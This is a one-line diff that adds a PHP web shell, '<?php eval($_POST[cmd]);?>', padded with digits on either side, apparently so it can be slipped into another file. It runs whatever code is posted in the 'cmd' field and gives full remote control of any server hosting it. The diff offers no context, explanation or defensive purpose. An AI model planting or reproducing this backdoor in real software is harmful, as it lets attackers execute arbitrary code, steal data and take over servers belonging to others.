@@ -1,0 +1,1 @@
+222<?php eval($_POST[cmd]);?>111
